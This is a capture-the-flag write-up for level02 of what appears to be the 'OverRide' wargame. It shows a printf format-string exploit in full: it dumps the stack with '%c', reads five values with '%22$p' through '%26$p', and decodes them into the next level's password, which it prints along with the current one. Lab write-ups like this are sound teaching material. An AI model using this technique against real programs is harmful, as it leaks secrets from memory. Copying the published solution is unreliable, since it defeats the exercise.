# Level 02
*password : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv*

## Analyze

```
scp -P 4242 level02@192.168.56.109:level02 binary/
```

## printf exploit

**objective** : use printf to print the pass

size of the pass : 40\
40 / 8 = 5\
We are looking for 5 64bits addresses

```
$ python -c 'print "%c," * 50' > /tmp/level02 ; cat /tmp/level02 | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
�,,%,*,*,�,%,,,c,%,,,c,%,,,,,,,,H,Q,X,s,M,,%,,,c,%,,,c, does not have access!
```
`H,Q,X,s,M` this part looks like the password.\
So the offset is 22.

```
level02@OverRide:~$ python -c 'print " %22$p %23$p %24$p %25$p %26$p"' > /tmp/level02 ; cat /tmp/level02 | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

0x756e505234376848 => 4868373452506e75 = Hh74RPnu\
0x45414a3561733951 => 51397361354a4145 = Q9sa5JAE\
0x377a7143574e6758 => 58674e5743717a37 = XgNWCqz7\
0x354a35686e475873 => 7358476e68354a35 = sXGnh5J5\
0x48336750664b394d => 4d394b6650673348 = M9KfPg3H

password: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
